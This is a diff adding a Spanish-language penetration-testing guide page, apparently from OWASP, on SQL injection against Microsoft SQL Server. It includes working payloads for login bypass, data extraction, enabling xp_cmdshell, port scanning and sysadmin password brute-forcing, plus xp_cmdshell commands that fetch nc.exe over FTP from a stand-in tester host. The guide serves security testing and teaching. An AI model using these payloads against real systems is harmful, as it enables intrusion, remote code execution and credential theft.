@@ -1,0 +1,188 @@
+<h1 id="sql-server">SQL Server</h1>
+<h2 id="summary">Resumen</h2>
+<p>En esta sección se tratarán algunas técnicas de <a href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank" rel="noopener">Inyección SQL</a> que aprovechan características específicas de Microsoft SQL Server.</p>
+<p>Las vulnerabilidades de inyección SQL ocurren siempre que se utiliza una entrada en la construcción de una consulta SQL sin estar adecuadamente restringida o sanitizada. El uso de SQL dinámico (la construcción de consultas SQL mediante concatenación de cadenas) abre la puerta a estas vulnerabilidades. La inyección SQL permite a un atacante acceder a los servidores SQL y ejecutar código SQL con los privilegios del usuario utilizado para conectarse a la base de datos.</p>
+<p>Como se explica en <a href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank" rel="noopener">SQL injection</a>, explotar una inyección SQL requiere dos cosas: un punto de entrada y un exploit para introducir. Cualquier parámetro controlado por el usuario que sea procesado por la aplicación podría estar ocultando una vulnerabilidad. Esto incluye:</p>
+<ul>
+<li>Parámetros de la aplicación en query strings (por ejemplo, peticiones GET)</li>
+<li>Parámetros de la aplicación incluidos como parte del cuerpo de una petición POST</li>
+<li>Información relacionada con el navegador (por ejemplo, user-agent, referrer)</li>
+<li>Información relacionada con el host (por ejemplo, nombre de host, IP)</li>
+<li>Información relacionada con la sesión (por ejemplo, ID de usuario, cookies)</li>
+</ul>
+<p>Microsoft SQL server tiene algunas características únicas, por lo que algunos exploits deben personalizarse especialmente para esta aplicación.</p>
+<h2 id="how-to-test">Cómo probar</h2>
+<h3 id="sql-server-characteristics">Características de SQL Server</h3>
+<p>Para empezar, veamos algunos operadores y comandos/procedimientos almacenados de SQL Server útiles en una prueba de inyección SQL:</p>
+<ul>
+<li>operador de comentario: <code>--</code> (útil para forzar a la consulta a ignorar el resto de la consulta original; esto no será necesario en todos los casos)</li>
+<li>separador de consultas: <code>;</code> (punto y coma)</li>
+<li>Procedimientos almacenados y características útiles:<ul>
+<li><a href="https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql" target="_blank" rel="noopener">xp_cmdshell</a> ejecuta un shell de comandos en el servidor bajo el contexto de la cuenta de servicio de SQL Server. Requiere privilegios de <code>sysadmin</code> y está deshabilitado por defecto desde SQL Server 2005 (puede volver a habilitarse con <code>sp_configure</code> cuando se muestran las opciones avanzadas).</li>
+<li><code>xp_regread</code> lee un valor arbitrario del Registro (procedimiento extendido no documentado)</li>
+<li><code>xp_regwrite</code> escribe un valor arbitrario en el Registro (procedimiento extendido no documentado)</li>
+<li><a href="https://learn.microsoft.com/en-us/previous-versions/sql/sql-server-2008/ms180099(v=sql.100)" target="_blank" rel="noopener">sp_makewebtask</a> (eliminado; presente solo en versiones muy antiguas de SQL Server) escribía los resultados de una consulta en un archivo mediante el Web Assistant.</li>
+<li><a href="https://learn.microsoft.com/en-us/previous-versions/sql/sql-server-2008-r2/ms189505(v=sql.105)" target="_blank" rel="noopener">xp_sendmail</a> (eliminado junto con SQL Mail) enviaba correo electrónico que podía incluir como adjunto un conjunto de resultados de una consulta.</li>
+</ul>
+</li>
+</ul>
+<p>Los ejemplos siguientes se centran en técnicas que siguen siendo relevantes en SQL Server y en Azure SQL Managed Instance cuando se exponen funciones con privilegios. La mayoría usa <code>exec</code>.</p>
+<p>A continuación mostramos cómo ejecutar un comando de shell que escribe la salida del comando <code>dir c:\inetpub</code> en un archivo navegable, suponiendo que el servidor web y el servidor de base de datos residen en el mismo host. La siguiente sintaxis usa <code>xp_cmdshell</code>:</p>
+<p><code>exec master.dbo.xp_cmdshell &#39;dir c:\inetpub &gt; c:\inetpub\wwwroot\test.txt&#39;--</code></p>
+<p>En versiones antiguas de SQL Server que aún proporcionan los procedimientos del Web Assistant, podría usarse <code>sp_makewebtask</code> en su lugar:</p>
+<p><code>exec sp_makewebtask &#39;C:\Inetpub\wwwroot\test.txt&#39;, &#39;select * from master.dbo.sysobjects&#39;--</code></p>
+<p>Una ejecución exitosa creará un archivo que el evaluador podrá navegar.</p>
+<p>Además, las funciones integradas y las variables de entorno de SQL Server son muy útiles. Lo siguiente usa la función <code>db_name()</code> para provocar un error que devolverá el nombre de la base de datos:</p>
+<p><code>/controlboard.asp?boardID=2&amp;itemnum=1%20AND%201=CONVERT(int,%20db_name())</code></p>
+<p>Nótese el uso de <a href="https://learn.microsoft.com/en-us/sql/t-sql/functions/cast-and-convert-transact-sql" target="_blank" rel="noopener">convert</a>:</p>
+<p><code>CONVERT ( data_type [ ( length ) ] , expression [ , style ] )</code></p>
+<p><code>CONVERT</code> intentará convertir el resultado de <code>db_name</code> (una cadena) en una variable entera, provocando un error que, si la aplicación vulnerable lo muestra, contendrá el nombre de la base de datos.</p>
+<p>El siguiente ejemplo usa la variable de entorno <code>@@version</code>, combinada con una inyección de estilo <code>union select</code>, para averiguar la versión de SQL Server.</p>
+<p><code>/form.asp?prop=33%20union%20select%201,2006-01-06,2007-01-06,1,&#39;stat&#39;,&#39;name1&#39;,&#39;name2&#39;,2006-01-06,1,@@version%20--</code></p>
+<p>Y aquí está el mismo ataque, pero usando de nuevo el truco de conversión:</p>
+<p><code>/controlboard.asp?boardID=2&amp;itemnum=1%20AND%201=CONVERT(int,%20@@VERSION)</code></p>
+<p>La recopilación de información es útil para explotar vulnerabilidades de software en el SQL Server, mediante la explotación de un ataque de inyección SQL o el acceso directo al listener SQL.</p>
+<p>A continuación mostramos varios ejemplos que explotan vulnerabilidades de inyección SQL a través de diferentes puntos de entrada.</p>
+<h3 id="example-1-sql-injection-in-a-get-request">Ejemplo 1: inyección SQL en una petición GET</h3>
+<p>El caso más sencillo (y a veces el más gratificante) sería el de una página de inicio de sesión que solicita un nombre de usuario y una contraseña para el inicio de sesión del usuario. Se puede intentar introducir la siguiente cadena &quot;&#39; or &#39;1&#39;=&#39;1&quot; (sin comillas dobles):</p>
+<p><code>https://vulnerable.web.app/login.asp?Username=&#39;%20or%20&#39;1&#39;=&#39;1&amp;Password=&#39;%20or%20&#39;1&#39;=&#39;1</code></p>
+<p>Si la aplicación usa consultas SQL dinámicas y la cadena se añade a la consulta de validación de credenciales del usuario, esto puede dar lugar a un inicio de sesión exitoso en la aplicación.</p>
+<h3 id="example-2-sql-injection-in-a-get-request">Ejemplo 2: inyección SQL en una petición GET</h3>
+<p>Para averiguar cuántas columnas existen</p>
+<p><code>https://vulnerable.web.app/list_report.aspx?number=001%20UNION%20ALL%201,1,&#39;a&#39;,1,1,1%20FROM%20users;--</code></p>
+<h3 id="example-3-testing-in-a-post-request">Ejemplo 3: prueba en una petición POST</h3>
+<p>Inyección SQL, contenido HTTP POST: <code>email=%27&amp;whichSubmit=submit&amp;submit.x=0&amp;submit.y=0</code></p>
+<p>Un ejemplo completo de POST (<code>https://vulnerable.web.app/forgotpass.asp</code>):</p>
+<pre><code class="language-txt">POST /forgotpass.asp HTTP/1.1
+Host: vulnerable.web.app
+[...]
+Referer: https://vulnerable.web.app/forgotpass.asp
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 50
+
+email=%27&amp;whichSubmit=submit&amp;submit.x=0&amp;submit.y=0
+</code></pre>
+<p>El mensaje de error obtenido cuando se introduce un carácter <code>&#39;</code> (comilla simple) en el campo email es:</p>
+<pre><code class="language-txt">Microsoft OLE DB Provider for SQL Server error &#39;80040e14&#39;
+Unclosed quotation mark before the character string &#39;&#39; &#39;.
+/forgotpass.asp, line 15
+</code></pre>
+<h3 id="example-4-yet-another-useful-get-example">Ejemplo 4: otro ejemplo (útil) de GET</h3>
+<p>Obtener el código fuente de la aplicación</p>
+<p><code>a&#39; ; master.dbo.xp_cmdshell &#39; copy c:\inetpub\wwwroot\login.aspx c:\inetpub\wwwroot\login.txt&#39;;--</code></p>
+<h3 id="example-5-enabling-or-replacing-xpcmdshell">Ejemplo 5: habilitar o reemplazar <code>xp_cmdshell</code></h3>
+<p>Las líneas base de seguridad mantienen <code>xp_cmdshell</code> deshabilitado. Con privilegios de <code>sysadmin</code> (de forma nativa o tras recuperar la contraseña de <code>sa</code> o de administrador; véase más abajo), se puede volver a habilitar o recrear una funcionalidad equivalente.</p>
+<p>Habilitar <code>xp_cmdshell</code> inyectando:</p>
+<pre><code class="language-sql">master..sp_configure &#39;show advanced options&#39;,1
+reconfigure
+master..sp_configure &#39;xp_cmdshell&#39;,1
+reconfigure
+</code></pre>
+<p>En entornos antiguos de SQL Server 2000, si <code>xp_cmdshell</code> se eliminó con <code>sp_dropextendedproc</code>, podía restaurarse con:</p>
+<p><code>sp_addextendedproc &#39;xp_cmdshell&#39;,&#39;xp_log70.dll&#39;</code></p>
+<p>Si eso fallaba porque <code>xp_log70.dll</code> había sido movido o eliminado, un procedimiento personalizado usando OLE Automation (<code>sp_OACreate</code>, <code>sp_OAMethod</code>, <code>sp_OADestroy</code>) podía recrear la ejecución de shell, como describe Antonin Foller (véanse los enlaces al final de la página), siempre que OLE Automation siguiera habilitado.</p>
+<h3 id="example-6-referer--user-agent">Ejemplo 6: Referer / User-Agent</h3>
+<p>La cabecera <code>REFERER</code> establecida en:</p>
+<p><code>Referer: https://vulnerable.web.app/login.aspx&#39;, &#39;user_agent&#39;, &#39;some_ip&#39;); [SQL CODE]--</code></p>
+<p>Permite la ejecución de código SQL arbitrario. Lo mismo ocurre con la cabecera User-Agent establecida en:</p>
+<p><code>User-Agent: user_agent&#39;, &#39;some_ip&#39;); [SQL CODE]--</code></p>
+<h3 id="example-7-sql-server-as-a-port-scanner">Ejemplo 7: SQL Server como escáner de puertos</h3>
+<p>En SQL Server, uno de los comandos más útiles (al menos para el pentester) es OPENROWSET, que se usa para ejecutar una consulta en otro servidor de base de datos y recuperar los resultados. El evaluador de penetración puede usar este comando para escanear puertos de otras máquinas en la red objetivo, inyectando la siguiente consulta:</p>
+<p><code>select * from OPENROWSET(&#39;SQLOLEDB&#39;,&#39;uid=sa;pwd=foobar;Network=DBMSSOCN;Address=x.y.w.z,p;timeout=5&#39;,&#39;select 1&#39;)--</code></p>
+<p>Esta consulta intentará una conexión a la dirección x.y.w.z en el puerto p. Si el puerto está cerrado, se devolverá el siguiente mensaje:</p>
+<p><code>SQL Server does not exist or access denied</code></p>
+<p>Por otro lado, si el puerto está abierto, se devolverá uno de los siguientes errores:</p>
+<p><code>General network error. Check your network documentation</code></p>
+<p><code>OLE DB provider &#39;sqloledb&#39; reported an error. The provider did not give any information about the error.</code></p>
+<p>Por supuesto, el mensaje de error no siempre está disponible. Si ese es el caso, podemos usar el tiempo de respuesta para entender qué está pasando: con un puerto cerrado se consumirá el tiempo de espera (timeout, 5 segundos en este ejemplo), mientras que un puerto abierto devolverá el resultado de inmediato.</p>
+<p>Hay que tener en cuenta que <code>OPENROWSET</code> y las Ad Hoc Distributed Queries están deshabilitadas por defecto desde SQL Server 2005 (estaban habilitadas por defecto en SQL Server 2000).</p>
+<h3 id="example-8-upload-of-executables">Ejemplo 8: carga de ejecutables</h3>
+<p>Una vez que podemos usar <code>xp_cmdshell</code> (ya sea el nativo o uno personalizado), podemos cargar fácilmente ejecutables en el servidor de base de datos objetivo. Una opción muy común es <code>netcat.exe</code>, pero aquí sería útil cualquier troyano. Si al objetivo se le permite iniciar conexiones FTP hacia la máquina del evaluador, todo lo que se necesita es inyectar las siguientes consultas:</p>
+<pre><code class="language-sql">exec master..xp_cmdshell &#39;echo open ftp.tester.org &gt; ftpscript.txt&#39;;--
+exec master..xp_cmdshell &#39;echo USER &gt;&gt; ftpscript.txt&#39;;--
+exec master..xp_cmdshell &#39;echo PASS &gt;&gt; ftpscript.txt&#39;;--
+exec master..xp_cmdshell &#39;echo bin &gt;&gt; ftpscript.txt&#39;;--
+exec master..xp_cmdshell &#39;echo get nc.exe &gt;&gt; ftpscript.txt&#39;;--
+exec master..xp_cmdshell &#39;echo quit &gt;&gt; ftpscript.txt&#39;;--
+exec master..xp_cmdshell &#39;ftp -s:ftpscript.txt&#39;;--
+</code></pre>
+<p>En este punto, <code>nc.exe</code> se habrá cargado y estará disponible.</p>
+<p>Si el firewall no permite FTP, tenemos una alternativa que aprovecha el depurador de Windows, <code>debug.exe</code>, que está instalado por defecto en todas las máquinas Windows. <code>Debug.exe</code> admite scripts y es capaz de crear un ejecutable mediante la ejecución de un archivo de script adecuado. Lo que necesitamos hacer es convertir el ejecutable en un script de depuración (que es un archivo 100% ASCII), cargarlo línea por línea y finalmente llamar a <code>debug.exe</code> sobre él. Existen varias herramientas que crean este tipo de archivos de depuración (por ejemplo: <code>makescr.exe</code> de Ollie Whitehouse y <code>dbgtool.exe</code> de <code>toolcrypt.org</code>). Las consultas a inyectar serán por tanto las siguientes:</p>
+<pre><code class="language-sql">exec master..xp_cmdshell &#39;echo [debug script line #1 of n] &gt; debugscript.txt&#39;;--
+exec master..xp_cmdshell &#39;echo [debug script line #2 of n] &gt;&gt; debugscript.txt&#39;;--
+....
+exec master..xp_cmdshell &#39;echo [debug script line #n of n] &gt;&gt; debugscript.txt&#39;;--
+exec master..xp_cmdshell &#39;debug.exe &lt; debugscript.txt&#39;;--
+</code></pre>
+<p>En este punto, nuestro ejecutable está disponible en la máquina objetivo, listo para ejecutarse. Existen herramientas que automatizan este proceso, siendo la más destacada <code>Bobcat</code>, que se ejecuta en Windows, y <code>Sqlninja</code>, que se ejecuta en Unix (véanse las herramientas al final de esta página).</p>
+<h3 id="obtain-information-when-it-is-not-displayed-out-of-band">Obtener información cuando no se muestra (out of band)</h3>
+<p>No todo está perdido cuando la aplicación web no devuelve ninguna información, como mensajes de error descriptivos (cf. <a href="https://owasp.org/www-community/attacks/Blind_SQL_Injection" target="_blank" rel="noopener">Blind SQL Injection</a>). Por ejemplo, podría ocurrir que se tenga acceso al código fuente (por ejemplo, porque la aplicación web está basada en software de código abierto). Entonces, el pentester puede explotar sin conexión todas las vulnerabilidades de inyección SQL descubiertas en la aplicación web. Aunque un IPS podría detener algunos de estos ataques, la mejor forma de proceder sería la siguiente: desarrollar y probar los ataques en un entorno de pruebas creado para ese fin, y luego ejecutar esos ataques contra la aplicación web que se está evaluando.</p>
+<p>Otras opciones para ataques out of band se describen en el <a href="#/4-Web_Application_Security_Testing/07-Injection/05.3-SQL_Server@example-4-yet-another-useful-get-example">ejemplo 4 anterior</a>.</p>
+<h3 id="blind-sql-injection-attacks">Ataques de inyección SQL ciega</h3>
+<h4 id="trial-and-error">Prueba y error</h4>
+<p>Alternativamente, se puede probar suerte. Es decir, el atacante puede suponer que existe una vulnerabilidad de inyección SQL ciega u out-of-band en la aplicación web. Entonces seleccionará un vector de ataque (por ejemplo, una entrada web), <a href="#/6-Appendix/D-Fuzzing">usará vectores de fuzzing</a> contra este canal y observará la respuesta. Por ejemplo, si la aplicación web busca un libro usando una consulta</p>
+<pre><code class="language-sql">select * from books where title=&quot;text entered by the user&quot;
+</code></pre>
+<p>entonces el evaluador de penetración podría introducir el texto: <code>&#39;Bomba&#39; OR 1=1-</code> y, si los datos no se validan correctamente, la consulta se ejecutará y devolverá toda la lista de libros. Esto es evidencia de que existe una vulnerabilidad de inyección SQL. El evaluador de penetración podría más adelante &quot;jugar&quot; con las consultas para evaluar la criticidad de esta vulnerabilidad.</p>
+<blockquote>
+<p><strong><em>NOTA:</em></strong>  Hay que tener cuidado al inyectar la condición OR 1=1 en una consulta SQL. Aunque esto puede ser inofensivo en el contexto inicial en el que se inyecta, es común que las aplicaciones usen los datos de una sola petición en varias consultas diferentes. Si la condición llega, por ejemplo, a una sentencia UPDATE o DELETE, puede producirse una pérdida accidental de datos.</p>
+</blockquote>
+<h4 id="if-multiple-error-messages-displayed">Si se muestran varios mensajes de error</h4>
+<p>Por otro lado, si no se dispone de información previa, aún existe la posibilidad de atacar explotando algún &quot;canal encubierto&quot; (covert channel). Puede ocurrir que los mensajes de error descriptivos estén bloqueados, pero que los mensajes de error den cierta información. Por ejemplo:</p>
+<ul>
+<li>En algunos casos, la aplicación web (en realidad, el servidor web) podría devolver el tradicional <code>500: Internal Server Error</code>, por ejemplo cuando la aplicación devuelve una excepción que podría generarse, por ejemplo, por una consulta con comillas sin cerrar.</li>
+<li>Mientras que en otros casos el servidor devolverá un mensaje <code>200 OK</code>, pero la aplicación web devolverá algún mensaje de error insertado por los desarrolladores, como <code>Internal server error</code> o <code>bad data</code>.</li>
+</ul>
+<p>Este simple bit de información puede ser suficiente para entender cómo construye la aplicación web la consulta SQL dinámica y así ajustar un exploit. Otro método out-of-band es mostrar los resultados a través de archivos navegables por HTTP.</p>
+<h4 id="timing-attacks">Ataques de temporización</h4>
+<p>Hay una posibilidad más para realizar un ataque de inyección SQL ciega cuando no hay respuesta visible de la aplicación: midiendo el tiempo que tarda la aplicación web en responder a una petición. Un ataque de este tipo se <a href="https://web.archive.org/web/20160413052024/https://www.encription.co.uk/downloads/more_advanced_sql_injection.pdf" target="_blank" rel="noopener">describe en Anley</a>, de donde tomamos los siguientes ejemplos. Un enfoque típico usa el comando <code>waitfor delay</code>: supongamos que el atacante quiere comprobar si existe la base de datos de ejemplo <code>pubs</code>; simplemente inyectará el siguiente comando:</p>
+<p><code>if exists (select * from pubs..pub_info) waitfor delay &#39;0:0:5&#39;</code></p>
+<p>Dependiendo del tiempo que tarde la consulta en devolver una respuesta, sabremos la respuesta. De hecho, aquí tenemos dos cosas: una <code>vulnerabilidad de inyección SQL</code> y un <code>canal encubierto</code> que permite al evaluador de penetración obtener 1 bit de información por cada consulta. Por tanto, usando varias consultas (tantas como bits tenga la información requerida), el pentester puede obtener cualquier dato que esté en la base de datos. Véase la siguiente consulta</p>
+<pre><code class="language-sql">declare @s varchar(8000)
+declare @i int
+select @s = db_name()
+select @i = [some value]
+if (select len(@s)) &lt; @i waitfor delay &#39;0:0:5&#39;
+</code></pre>
+<p>Midiendo el tiempo de respuesta y usando diferentes valores para <code>@i</code>, podemos deducir la longitud del nombre de la base de datos actual, y luego comenzar a extraer el nombre en sí con la siguiente consulta:</p>
+<p><code>if (ascii(substring(@s, @byte, 1)) &amp; ( power(2, @bit))) &gt; 0 waitfor delay &#39;0:0:5&#39;</code></p>
+<p>Esta consulta esperará 5 segundos si el bit <code>@bit</code> del byte <code>@byte</code> del nombre de la base de datos actual es 1, y volverá de inmediato si es 0. Anidando dos ciclos (uno para <code>@byte</code> y otro para <code>@bit</code>), podremos extraer toda la información.</p>
+<p>Sin embargo, podría ocurrir que el comando <code>waitfor</code> no esté disponible (por ejemplo, porque lo filtra un IPS o un web application firewall). Esto no significa que no se puedan realizar ataques de inyección SQL ciega, ya que el evaluador de penetración solo necesita encontrar alguna operación que consuma tiempo y que no esté filtrada. Por ejemplo</p>
+<pre><code class="language-sql">declare @i int select @i = 0
+while @i &lt; 0xaffff begin
+select @i = @i + 1
+end
+</code></pre>
+<h4 id="checking-for-version-and-vulnerabilities">Comprobación de la versión y de vulnerabilidades</h4>
+<p>El mismo enfoque de temporización puede usarse para identificar la versión de SQL Server mediante la variable integrada <code>@@version</code>:</p>
+<p><code>select @@version</code></p>
+<p>Ejemplos de respuestas:</p>
+<p><code>Microsoft SQL Server 2022 (RTM) - 16.0.1000.6 (X64) ...</code></p>
+<p><code>Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) ...</code></p>
+<p><code>Microsoft SQL Server 2005 - 9.00.1399.06 (Intel X86) Oct 14 2005 00:33:37</code></p>
+<p>Dado que el año del producto y el número de build se encuentran en posiciones diferentes según la versión, es mejor extraer una subcadena distintiva (por ejemplo, <code>2022</code>, <code>2019</code> o el número de versión principal como <code>16.0</code>) en lugar de fijar una única posición de carácter. Una comprobación basada en temporización podría ser así:</p>
+<p><code>if (select @@version) like &#39;%2022%&#39; waitfor delay &#39;0:0:5&#39;</code></p>
+<h3 id="example-9-bruteforce-of-sysadmin-password">Ejemplo 9: fuerza bruta de la contraseña de sysadmin</h3>
+<p>Para forzar por fuerza bruta la contraseña de sysadmin, podemos aprovechar el hecho de que <code>OPENROWSET</code> necesita credenciales adecuadas para realizar correctamente la conexión y que dicha conexión también puede &quot;redirigirse en bucle&quot; (loop) hacia el propio servidor de base de datos local. Combinando estas características con un ataque de inyección por inferencia basado en la temporización de las respuestas, podemos inyectar el siguiente código:</p>
+<p><code>select * from OPENROWSET(&#39;SQLOLEDB&#39;,&#39;&#39;;&#39;sa&#39;;&#39;&lt;pwd&gt;&#39;,&#39;select 1;waitfor delay &#39;&#39;0:0:5&#39;&#39; &#39;)</code></p>
+<p>Lo que estamos haciendo aquí es intentar una conexión a la base de datos local (especificada por el campo vacío después de <code>SQLOLEDB</code>) usando <code>sa</code> y <code>&lt;pwd&gt;</code> como credenciales. Si la contraseña es correcta y la conexión tiene éxito, la consulta se ejecuta, haciendo que la base de datos espere 5 segundos (y también devolviendo un valor, ya que OPENROWSET espera al menos una columna). Obteniendo las contraseñas candidatas de una lista de palabras y midiendo el tiempo necesario para cada conexión, podemos intentar adivinar la contraseña correcta. En &quot;Data-mining with SQL Injection and Inference&quot;, David Litchfield lleva esta técnica aún más lejos, inyectando un fragmento de código para forzar por fuerza bruta la contraseña de sysadmin usando los propios recursos de CPU del servidor de base de datos.</p>
+<p>Una vez que tenemos la contraseña de sysadmin, tenemos dos opciones:</p>
+<ul>
+<li>Inyectar todas las consultas siguientes usando <code>OPENROWSET</code>, para usar los privilegios de sysadmin</li>
+<li>Añadir nuestro usuario actual al grupo sysadmin usando <code>sp_addsrvrolemember</code>. El nombre de usuario actual puede extraerse mediante inyección por inferencia contra la variable <code>system_user</code>.</li>
+</ul>
+<p>Hay que recordar que las Ad Hoc Distributed Queries y <code>OPENROWSET</code> han estado restringidas desde SQL Server 2005 y normalmente deben habilitarse explícitamente por un administrador.</p>
+<h2 id="tools">Herramientas</h2>
+<ul>
+<li><a href="https://sqlmap.org/" target="_blank" rel="noopener">Bernardo Damele A. G.: sqlmap, automatic SQL injection tool</a></li>
+</ul>
+<h2 id="references">Referencias</h2>
+<h3 id="whitepapers">Whitepapers</h3>
+<ul>
+<li><a href="https://dl.packetstormsecurity.net/papers/attack/sqlinference.pdf" target="_blank" rel="noopener">David Litchfield: &quot;Data-mining with SQL Injection and Inference&quot;</a></li>
+<li><a href="https://www.cgisecurity.com/lib/more_advanced_sql_injection.pdf" target="_blank" rel="noopener">Chris Anley, &quot;(more) Advanced SQL Injection&quot;</a></li>
+<li><a href="https://www.databasejournal.com/ms-sql/useful-undocumented-extended-stored-procedures/" target="_blank" rel="noopener">Alexander Chigrik: &quot;Useful undocumented extended stored procedures&quot;</a></li>
+<li><a href="https://www.motobit.com/tips/detpg_cmdshell" target="_blank" rel="noopener">Antonin Foller: &quot;Custom xp_cmdshell, using shell object&quot;</a></li>
+<li><a href="https://www.cisecurity.org/wp-content/uploads/2017/05/SQL-Injection-White-Paper.pdf" target="_blank" rel="noopener">SQL Injection</a></li>
+<li><a href="https://www.cgisecurity.com/lib/Manipulating_SQL_Server_Using_SQL_Injection.pdf" target="_blank" rel="noopener">Cesar Cerrudo: Manipulating Microsoft SQL Server Using SQL Injection, uploading files, getting into internal network, port scanning, DOS</a></li>
+</ul>
